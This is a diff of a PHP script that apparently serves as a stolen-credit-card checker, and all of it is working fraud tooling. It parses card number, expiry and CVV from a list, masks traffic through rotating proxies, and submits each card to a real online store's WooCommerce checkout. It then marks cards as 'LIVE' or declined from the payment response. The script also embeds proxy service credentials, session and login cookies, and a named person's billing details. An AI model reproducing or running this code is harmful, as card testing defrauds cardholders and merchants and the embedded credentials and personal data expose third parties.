@@ -23,14 +23,6 @@ $cc = $separar[0];
 $mes = $separar[1];
 $ano = $separar[2];
 $cvv = $separar[3];
-$binn = substr($cc,0,6);
-
-
-if(strlen($mes<='09')){
-        $mes1=substr($mes,1,2);
-    } else {
-        $mes1=$mes;
-    }
 $cc1 = substr($cc,0,4);
 $cc2 = substr($cc,4,4);
 $cc3 = substr($cc,8,4);
@@ -38,6 +30,8 @@ $cc4 = substr($cc,12,4);
 $cc5 = substr($cc,0,4);
 $cc6 = substr($cc,4,6);
 $cc7 = substr($cc,10,5);
+$binn = substr($cc,0,6);
+
 
 
 if($cbin == "3"){
@@ -47,14 +41,16 @@ if($cbin == "3"){
 }
 
 
+if(strlen($mes<='09')){
+        $mes1=substr($mes,1,2);
+    } else {
+        $mes1=$mes;
+    }
 
 If(strlen($ano) > 2)
 {
   $ano = substr($ano,2,2);
 }
-
-
-
  function value($str,$find_start,$find_end){
 $start = @strpos($str,$find_start);
 if ($start === false) {
@@ -109,249 +105,101 @@ function datosapellido(){
 
 
 function email($nombre){
-  $email = preg_replace('<\W+>', "", $nombre).rand(0000,9999)."@hotmail.com";
+  $email = preg_replace('<\W+>', "", $apellido).rand(0000,9999)."@hotmail.com";
   return $email;
 }
+ function ibuuproxy(){
+  $proxySocks = file("Socks5.txt");
+   $myproxy = rand(0, sizeof($proxySocks)-1);
+   $proxySocks = $proxySocks[$myproxy];
+ return $proxySocks;
+}
+
 
 ///$cpf = cpf(1);
 $nombre = datosnombre();
 $apellido = datosapellido();
-$email = email($nombre);
+$email = email($apellido);
 $zip = substr(str_shuffle(str_repeat("0123456789", 5)), 0, 5);
-$idb = substr(str_shuffle(str_repeat("0123456789", 9)), 0, 9);
-$username = 'lum-customer-hl_6366aa06-zone-static_res';
-$password = 'a9by3kql965v';
+$username = 'lum-customer-hl_7873c611-zone-static_res';
+$password = 'p8txkzc6mq9h';
 $port = 22225;
 $session = mt_rand();
 $super_proxy = 'zproxy.lum-superproxy.io';
-
 $ad1 = substr(str_shuffle(str_repeat("0123456789", 2)), 0, 2);
 $city = substr(str_shuffle(str_repeat("abcdefghijklmnopqrstuvwxyz", 5)), 0, 5);
 
-function ibuuproxy(){
-  $poxySocks = file("Socks5.txt");
-   $myproxy = rand(0, sizeof($poxySocks)-1);
-   $poxySocks = $poxySocks[$myproxy];
- return $poxySocks;
-}
 
-$poxySocks5 = ibuuproxy();
-
-$fname = 'Justin'.rand(abcdefghijklmnopqrstuvwxyz,999).'';
-$lname = 'Wang';
-// $email = $fname.'.'.$lname.''.rand(10,99999).'@yopmail.com';
-$email2 = $fname.rand(10,999).'@yopmail.com';
-// //$password = 'P@5%Word';
-$password2 = 'Hansabhen1@';
-$counters = substr(str_shuffle(str_repeat("0123456789abcdefghijklmopqrstuvxyz", 32)), 0, 32);
-$counters2 = substr(str_shuffle(str_repeat("0123456789abcdefghijklmopqrstuvxyz", 32)), 0, 32);
-
-$dbtime = substr(str_shuffle(str_repeat("0123456789", 10)), 0, 10);
+// echo $binn;
 
 
 
-
-//============================================================================================================================================================
-// function updatecart(){
+$auth = substr(str_shuffle(str_repeat("ABCDEFGHIJabcdefghijklmopqrstuvxyz", 12)), 0, 12);
 
 
-// $ch = curl_init();
-// curl_setopt($ch, CURLOPT_URL, 'https://www.entosupplies.com.au/equipment/storage/pipettes/pasteur-plastic-pipettes/');
-// curl_setopt($ch, CURLOPT_HEADER, 0);
-// curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
-//    // curl_setopt($ch, CURLOPT_PROXY, $proxySocks);
-//    // curl_setopt($ch, CURLOPT_PROXYTYPE, CURLPROXY_SOCKS5);
-// // curl_setopt($ch, CURLOPT_PROXY, "http://$super_proxy:$port");
-// // curl_setopt($ch, CURLOPT_PROXYUSERPWD, "$username-session-$session:$password");
-// curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
-// curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
-// curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
-// curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
-// curl_setopt($ch, CURLOPT_ENCODING, "gzip, deflate, br");
-// curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
-// curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
-// curl_setopt($ch, CURLOPT_HTTPHEADER, array(
-// 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
-// 'Accept-Encoding: gzip, deflate, br',
-// 'Accept-Language: en-US,en;q=0.9',
-// 'Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryu2trXQJjayDO4cu5',
-// 'cookie: cookielawinfo-checkbox-non-necessary=yes; wp_woocommerce_session_94e7d48ec1fbb7e6b286ae53649eecdb=4c9bcac2caa9fb6d1dca1da5fa9f373a%7C%7C1590934138%7C%7C1590930538%7C%7Cccdd230651bf7a467522a0d08d2452c3; cookielawinfo-checkbox-necessary=yes',
-// 'origin: https://www.entosupplies.com.au',
-// 'referer: https://www.entosupplies.com.au/equipment/storage/pipettes/pasteur-plastic-pipettes/',
-// 'user-agent: '.$browser.''
-// ));
+#req1==============================================================================
 
-// curl_setopt($ch, CURLOPT_POSTFIELDS, '------WebKitFormBoundarym5oZPbWtZ472ZBi5
-// Content-Disposition: form-data; name="quantity[5781]"
-
-// 1
-// ------WebKitFormBoundarym5oZPbWtZ472ZBi5
-// Content-Disposition: form-data; name="quantity[5787]"
+// #==========================================================================================================
 
 
-// ------WebKitFormBoundarym5oZPbWtZ472ZBi5
-// Content-Disposition: form-data; name="quantity[5782]"
-
-
-// ------WebKitFormBoundarym5oZPbWtZ472ZBi5
-// Content-Disposition: form-data; name="quantity[5784]"
-
-
-// ------WebKitFormBoundarym5oZPbWtZ472ZBi5
-// Content-Disposition: form-data; name="quantity[5783]"
-
-
-// ------WebKitFormBoundarym5oZPbWtZ472ZBi5
-// Content-Disposition: form-data; name="quantity[5785]"
-
-
-// ------WebKitFormBoundarym5oZPbWtZ472ZBi5
-// Content-Disposition: form-data; name="quantity[5786]"
-
-
-// ------WebKitFormBoundarym5oZPbWtZ472ZBi5
-// Content-Disposition: form-data; name="quantity[5788]"
-
-
-// ------WebKitFormBoundarym5oZPbWtZ472ZBi5
-// Content-Disposition: form-data; name="quantity[5793]"
-
-
-// ------WebKitFormBoundarym5oZPbWtZ472ZBi5
-// Content-Disposition: form-data; name="quantity[5789]"
-
-
-// ------WebKitFormBoundarym5oZPbWtZ472ZBi5
-// Content-Disposition: form-data; name="quantity[5791]"
-
-
-// ------WebKitFormBoundarym5oZPbWtZ472ZBi5
-// Content-Disposition: form-data; name="quantity[5790]"
-
-
-// ------WebKitFormBoundarym5oZPbWtZ472ZBi5
-// Content-Disposition: form-data; name="quantity[5792]"
-
-
-// ------WebKitFormBoundarym5oZPbWtZ472ZBi5
-// Content-Disposition: form-data; name="add-to-cart"
-
-// 5780
-// ------WebKitFormBoundarym5oZPbWtZ472ZBi5
-// Content-Disposition: form-data; name="gtm4wp_id"
-
-// G-E976
-// ------WebKitFormBoundarym5oZPbWtZ472ZBi5
-// Content-Disposition: form-data; name="gtm4wp_name"
-
-// Pasteur Plastic Pipettes
-// ------WebKitFormBoundarym5oZPbWtZ472ZBi5
-// Content-Disposition: form-data; name="gtm4wp_sku"
-
-// G-E976
-// ------WebKitFormBoundarym5oZPbWtZ472ZBi5
-// Content-Disposition: form-data; name="gtm4wp_category"
-
-// Equipment/Storage
-// ------WebKitFormBoundarym5oZPbWtZ472ZBi5
-// Content-Disposition: form-data; name="gtm4wp_price"
-
-// 0.3
-// ------WebKitFormBoundarym5oZPbWtZ472ZBi5
-// Content-Disposition: form-data; name="gtm4wp_stocklevel"
-
-
-// ------WebKitFormBoundarym5oZPbWtZ472ZBi5--');
-
-
-// $b_pago = curl_exec($ch);
-// }
- // echo $b_pago;
-//  $token = trim(strip_tags(getstr($b_pago,'"nonce":"','"')));
-// $issuebank = trim(strip_tags(getstr($b_pago,'"issuingBank":"','"')));
-// $issuecountry = trim(strip_tags(getstr($b_pago,'"countryOfIssuance":"','"')));
-// $debit = trim(strip_tags(getstr($b_pago,'"debit":"','"')));
-// $prepaid = trim(strip_tags(getstr($b_pago,'"prepaid":"','"')));
-// $cardtype = trim(strip_tags(getstr($b_pago,'"cardType":"','"')));
-
-
-// //////////////////////// START REQUEST 2 ////////////////////////
 
 $ch = curl_init();
-curl_setopt($ch, CURLOPT_URL, 'https://lumera.com.au/?wc-ajax=checkout');
-
-//////////////////////// PROXY CALLS ////////////////////////////
-//               REMOVE '//' FOR PROXIES TO WORK BELOW
-
-//////////////////////// PROXYSCRAPE
-// curl_setopt($ch, CURLOPT_PROXY, '199.247.30.187:8080');
-// curl_setopt($ch, CURLOPT_PROXYTYPE, CURLPROXY_HTTP);
-//////////////////////// WEBSHARE
-// curl_setopt($ch, CURLOPT_PROXY, 'p.webshare.io:1080');
-// curl_setopt($ch, CURLOPT_PROXYTYPE, CURLPROXY_SOCKS5);
-// curl_setopt($ch, CURLOPT_PROXYUSERPWD, "vxrpebmq-rotate:a0fdakb6ts8a");
-
-//////////////////////// MANUAL Proxy List
-curl_setopt($ch, CURLOPT_PROXY, $poxySocks5);
-curl_setopt($ch, CURLOPT_PROXYTYPE, CURLPROXY_SOCKS4);// CHANGE TYPE ACCORDING TO LIST
-
-//////////////////////// LUMINATI
-// curl_setopt($ch, CURLOPT_PROXY, "http://$super_proxy:$port");
-// curl_setopt($ch, CURLOPT_PROXYUSERPWD, "$username-session-$session:$password");
-// End Proxy Calls
+curl_setopt($ch, CURLOPT_URL, 'https://www.entosupplies.com.au/?wc-ajax=checkout');
 curl_setopt($ch, CURLOPT_HEADER, 0);
+curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
+ // curl_setopt($ch, CURLOPT_PROXY, $proxySocks);
+ // curl_setopt($ch, CURLOPT_PROXYTYPE, CURLPROXY_SOCKS5);
+// curl_setopt($ch, CURLOPT_PROXY, "http://$super_proxy:$port");
+//  curl_setopt($ch, CURLOPT_PROXYUSERPWD, "$username-session-$session:$password");
 curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
 curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
 curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
+curl_setopt($ch, CURLOPT_ENCODING, "gzip, deflate, br");
 curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
-curl_setopt($ch, CURLOPT_ENCODING, 'gzip, deflate');
+curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
+curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
 curl_setopt($ch, CURLOPT_HTTPHEADER, array(
 'accept: application/json, text/javascript, */*; q=0.01',
 'accept-encoding: gzip, deflate, br',
 'accept-language: en-US,en;q=0.9',
 'content-type: application/x-www-form-urlencoded; charset=UTF-8',
-'cookie: wp_woocommerce_session_f2b6ce89df5c555c20d2734335c3d66b=c6af5fe4659f758ad0f19be2c77937ef%7C%7C1590945991%7C%7C1590942391%7C%7C1f491c8d64bb2e18fb550a0b40686852; woocommerce_recently_viewed=32; woocommerce_items_in_cart=1; woocommerce_cart_hash=5ac75155463701cb7107f4154ddf2d76',
-'origin: https://lumera.com.au',
-'referer: https://lumera.com.au/checkout/',
-'user-agent: '.$browser.'',
+'cookie: cookielawinfo-checkbox-non-necessary=yes; gtm4wp_user_registered=1; wordpress_logged_in_94e7d48ec1fbb7e6b286ae53649eecdb=pubgkittu%7C1592022867%7CFcnjvgMwovP16yhQI3ilusHeMcjSB7cy43Xrikdgjyn%7C79129341a5d25691a69e08ca7ba7423f056419240c29fdd7cffe34d29c0cf6bd; cookielawinfo-checkbox-necessary=yes; woocommerce_items_in_cart=1; wp_woocommerce_session_94e7d48ec1fbb7e6b286ae53649eecdb=8f40eff6739d7b7620e47754efec70e2%7C%7C1591117188%7C%7C1591113588%7C%7C4cc722aa9d5ccdfbde6b2841822197bf; woocommerce_cart_hash=fa653b28a44b9a0d0c4aae61d7817ed0',
+'origin: https://www.entosupplies.com.au',
+'referer: https://www.entosupplies.com.au/checkout/',
+'user-agent: '.$browser.''
 ));
 
-// //////////////////////// START POST FILED 1 ////////////////////////
-
-curl_setopt($ch, CURLOPT_POSTFIELDS, 'billing_first_name=Megha&billing_last_name=Shyam&billing_company=&billing_country=AU&billing_address_1=661+STATE+ST&billing_address_2=&billing_city=BINGHAMTON&billing_state=NSW&billing_postcode=2150&billing_phone=%2B61424152415&billing_email=pubgkittu%40gmail.com&shipping_first_name=&shipping_last_name=&shipping_company=&shipping_country=AU&shipping_address_1=&shipping_address_2=&shipping_city=&shipping_state=VIC&shipping_postcode=&order_comments=Leave+at+Front+Door+if+not+home&shipping_method%5B0%5D=table_rate%3A4%3A6&payment_method=anz_egate&anz_egate-card-number='.$cc1.'+'.$cc2.'+'.$cc3.'+'.$cc4.'&anz_egate-card-expiry='.$mes.'+%2F+'.$ano.'&anz_egate-card-cvc='.$cvv.'&woocommerce-process-checkout-nonce=2ea6ce4822&_wp_http_referer=%2F%3Fwc-ajax%3Dupdate_order_review');
-
-
-
-// //*****************************************************************************************************************************************************************************************************************************************************************************
-
+curl_setopt($ch, CURLOPT_POSTFIELDS, 'billing_first_name=Megha&billing_last_name=Shyam&billing_company=&billing_country=AU&billing_address_1=661+STATE+ST&billing_address_2=&billing_city=BINGHAMTON&billing_state=NSW&billing_postcode=2484&billing_phone=%2B61424152415&billing_email=pubgkittu%40gmail.com&shipping_first_name=Megha&shipping_last_name=Shyam&shipping_company=&shipping_country=AU&shipping_address_1=661+STATE+ST&shipping_address_2=&shipping_city=BINGHAMTON&shipping_state=NSW&shipping_postcode=2484&order_comments=&shipping_method%5B0%5D=australia_post%3AAUS_PARCEL_REGULAR&payment_method=anz_egate&anz_egate-card-number='.$cc1.'+'.$cc2.'+'.$cc3.'+'.$cc4.'&anz_egate-card-expiry='.$mes.'+%2F+'.$ano.'&anz_egate-card-cvc='.$cvv.'&terms=on&terms-field=1&woocommerce-process-checkout-nonce=f497ca3763&_wp_http_referer=%2F%3Fwc-ajax%3Dupdate_order_review');
 
 $result = curl_exec($ch);
-if (curl_errno($ch)) {
-    echo 'Error:'.curl_error($ch);
-}
-curl_close($ch);
-$message = trim(strip_tags(getstr($result,'"messages":"<ul class=\"woocommerce-error\" role=\"alert\">\n\t\t\t<li>\n\t\t\tPayment failed: ','\t\t<\/li>\n\t<\/ul>\n"')));
-// // $result = json_decode($result, true);
-// // $code = trim(strip_tags(getstr($result,'"message":"','"')));
-// // // $message2 = trim(strip_tags(getstr($result,'"message": "','"')));
 
 
 
-if(strpos($result,'"result":"success"')){
-      // updatecart();
+ $message = trim(strip_tags(getstr($result,'"messages":"<ul class=\"woocommerce-error\" role=\"alert\">\n\t\t\t<li>\n\t\t\tPayment failed: ','\t\t<\/li>\n\t<\/ul>\n"')));
+// // // // $code = trim(strip_tags(getstr($result,'"errorClass":"','"')));
+
+// // // // // // // // // //  // $message3 = trim(strip_tags(getstr($result,'"status": "','"')));
+
+// // // // // // // // // //  // $message4 = trim(strip_tags(getstr($result,'"errors": {"_all": ["','"]}')));
 
 
-       echo '<tr><td><font size="2"><font color="#FF0000">#Aprovada </font></td><td>&nbsp;&nbsp;&nbsp;<font size="2"><font color="#C0C0C0">'.$lista.'</font></td><td><font></font><td><font size="2">&nbsp;&nbsp;&nbsp;<b><font color="#FFDF00">[ L I V E ]&nbsp;&nbsp;&nbsp;<font size="0.5"><font color="#0086ff"> '.$issuecountry.' | '.$issuebank.' | Debit : '.$debit.' | Prepaid : '.$prepaid.'</font></b></font></td></tr>';
+ if(strpos($result,'"result":"success"')){
+    echo '<tr><td><font size="2"><font color="#00FF00">#Aprovada </font></td><td>&nbsp;&nbsp;&nbsp;<font size="2"><font color="#C0C0C0">'.$lista.'</font></td><td><font></font><td><font size="2">&nbsp;&nbsp;&nbsp;<b><font color="#FFDF00">  [ L I V E ]&nbsp;&nbsp;&nbsp;<font size="0.5"><font color="#0086ff"> '.$issuecountry.' | '.$issuebank.' | DEBIT- '.$type.' | cat-'.$category.'</font></b></font></td></tr>';
 
 
    }
+elseif(strpos($result,'Insufficient Funds')){
+  echo '<tr><td><font size="2"><font color="#FF0000">#Aprovada </font></td><td>&nbsp;&nbsp;&nbsp;<font size="2"><font color="#C0C0C0">'.$lista.'</font></td><td><font></font><td><font size="2">&nbsp;&nbsp;&nbsp;<b><font color="#FFDF00">  [ LIVE ]&nbsp;&nbsp;&nbsp;<font size="0.5"><font color="#0086ff"> '.$issuecountry.' | '.$issuebank.' | DEBIT- '.$type.' | cat-'.$category.'</font></b></font></td></tr>';
+   }
 else {
-  // updatecart();
-    echo '<tr><td><font size="2"><font color="#FF0000">#Reprovada </font></td><td>&nbsp;&nbsp;&nbsp;<font size="2"><font color="#C0C0C0">'.$lista.'</font></td><td><font></font><td><font size="2">&nbsp;&nbsp;&nbsp;<b><font color="#FFDF00">  [ '.$message.' ]&nbsp;&nbsp;&nbsp;<font size="0.5"><font color="#0086ff"> '.$issuecountry.' | '.$issuebank.' | Debit : '.$debit.' | Prepaid : '.$prepaid.'</font></b></font></td></tr>';
-  }
-curl_close($curl);
+
+       echo '<tr><td><font size="2"><font color="#FF0000">#Reprovada </font></td><td>&nbsp;&nbsp;&nbsp;<font size="2"><font color="#C0C0C0">'.$lista.'</font></td><td><font></font><td><font size="2">&nbsp;&nbsp;&nbsp;<b><font color="#FFDF00">  [ '.$message.' ]&nbsp;&nbsp;&nbsp;<font size="0.5"><font color="#0086ff"> '.$issuecountry.' | '.$issuebank.' | DEBIT- '.$type.' | cat- '.$category.'</font></b></font></td></tr>';
+
+// updatecart();
+}
+
+curl_close($ch);
 ob_flush();
-// echo $result
-    //echo $result;
-//echo $browser;
+   // echo $result;
+ // echo $c_pago;
 ?>
